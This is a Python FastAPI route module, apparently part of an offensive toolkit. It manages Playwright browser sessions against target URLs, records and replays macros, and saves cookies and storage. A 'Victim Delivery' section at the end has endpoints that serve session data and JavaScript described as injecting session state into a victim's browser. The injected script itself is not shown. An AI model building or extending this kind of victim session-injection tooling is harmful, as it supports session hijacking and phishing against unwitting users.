"""
Browser Session Recording API Routes

Provides endpoints for:
- Creating browser sessions
- Recording macros
- Saving session states
- Replaying macros
- Victim session delivery
"""

from fastapi import APIRouter, HTTPException, Query
from pydantic import BaseModel
from typing import Optional, List

from app.services.browser_session import browser_session_manager, PLAYWRIGHT_AVAILABLE

router = APIRouter(tags=["Browser Sessions"])


# === Models ===

class CreateSessionRequest(BaseModel):
    target_url: str
    name: Optional[str] = ""


class SaveSessionRequest(BaseModel):
    name: Optional[str] = ""
    description: Optional[str] = ""


class StopRecordingRequest(BaseModel):
    name: Optional[str] = ""
    description: Optional[str] = ""


# === Status ===

@router.get("/status")
async def get_status():
    """Check if browser session features are available"""
    return {
        'playwright_available': PLAYWRIGHT_AVAILABLE,
        'message': 'Playwright is available' if PLAYWRIGHT_AVAILABLE else 'Install with: pip install playwright && playwright install chromium'
    }


# === Session Management ===

@router.post("/sessions")
async def create_session(data: CreateSessionRequest):
    """Create a new browser session for a target URL"""
    if not PLAYWRIGHT_AVAILABLE:
        raise HTTPException(status_code=503, detail="Playwright not installed")

    try:
        result = await browser_session_manager.create_session(data.target_url, data.name)
        return result
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/sessions/{session_id}")
async def get_session(session_id: str):
    """Get info about a browser session"""
    info = await browser_session_manager.get_session_info(session_id)
    if not info:
        raise HTTPException(status_code=404, detail="Session not found")
    return info


@router.delete("/sessions/{session_id}")
async def close_session(session_id: str):
    """Close a browser session"""
    await browser_session_manager.close_session(session_id)
    return {'status': 'closed', 'session_id': session_id}


# === Recording ===

@router.post("/sessions/{session_id}/record/start")
async def start_recording(session_id: str):
    """Start recording macro for a session"""
    success = await browser_session_manager.start_recording(session_id)
    if not success:
        raise HTTPException(status_code=404, detail="Session not found")
    return {'status': 'recording', 'session_id': session_id}


@router.post("/sessions/{session_id}/record/stop")
async def stop_recording(session_id: str, data: StopRecordingRequest):
    """Stop recording and save macro"""
    macro_id = await browser_session_manager.stop_recording(session_id, data.name)
    if not macro_id:
        raise HTTPException(status_code=404, detail="Session not found")
    return {'status': 'saved', 'macro_id': macro_id}


# === Session State ===

@router.post("/sessions/{session_id}/save")
async def save_session_state(session_id: str, data: SaveSessionRequest):
    """Save current session state (cookies, storage, screenshot)"""
    saved_id = await browser_session_manager.save_session_state(session_id, data.name)
    if not saved_id:
        raise HTTPException(status_code=404, detail="Session not found")
    return {'status': 'saved', 'saved_id': saved_id}


@router.post("/saved/{saved_id}/restore")
async def restore_session(saved_id: str):
    """Create new session with restored state"""
    session_id = await browser_session_manager.restore_session_state(saved_id)
    if not session_id:
        raise HTTPException(status_code=404, detail="Saved session not found")
    return {'status': 'restored', 'session_id': session_id}


# === Macros ===

@router.get("/macros")
async def list_macros():
    """List all saved macros"""
    return {'macros': browser_session_manager.get_macros()}


@router.get("/macros/{macro_id}")
async def get_macro(macro_id: str):
    """Get a specific macro"""
    macro = browser_session_manager.get_macro(macro_id)
    if not macro:
        raise HTTPException(status_code=404, detail="Macro not found")
    return macro


@router.delete("/macros/{macro_id}")
async def delete_macro(macro_id: str):
    """Delete a macro"""
    if not browser_session_manager.delete_macro(macro_id):
        raise HTTPException(status_code=404, detail="Macro not found")
    return {'status': 'deleted', 'macro_id': macro_id}


@router.post("/macros/{macro_id}/replay")
async def replay_macro(macro_id: str, session_id: Optional[str] = Query(None)):
    """Replay a recorded macro"""
    result_session_id = await browser_session_manager.replay_macro(macro_id, session_id)
    if not result_session_id:
        raise HTTPException(status_code=404, detail="Macro not found")
    return {'status': 'replayed', 'session_id': result_session_id}


# === Saved Sessions ===

@router.get("/saved")
async def list_saved_sessions():
    """List all saved session states"""
    return {'saved_sessions': browser_session_manager.get_saved_sessions()}


@router.get("/saved/{saved_id}")
async def get_saved_session(saved_id: str):
    """Get a specific saved session"""
    saved = browser_session_manager.get_saved_session(saved_id)
    if not saved:
        raise HTTPException(status_code=404, detail="Saved session not found")
    return saved


@router.delete("/saved/{saved_id}")
async def delete_saved_session(saved_id: str):
    """Delete a saved session"""
    if not browser_session_manager.delete_saved_session(saved_id):
        raise HTTPException(status_code=404, detail="Saved session not found")
    return {'status': 'deleted', 'saved_id': saved_id}


# === Victim Delivery ===

@router.get("/saved/{saved_id}/victim-data")
async def get_victim_session_data(saved_id: str):
    """Get session data formatted for victim browser injection"""
    data = await browser_session_manager.get_victim_session_data(saved_id)
    if not data:
        raise HTTPException(status_code=404, detail="Saved session not found")
    return data


@router.get("/saved/{saved_id}/inject-script")
async def get_inject_script(saved_id: str):
    """Get JavaScript to inject session state into victim browser"""
    data = await browser_session_manager.get_victim_session_data(saved_id)
    if not data:
        raise HTTPException(status_code=404, detail="Saved session not found")
    return {
        'content_type': 'application/javascript',
        'script': data['inject_script']
    }
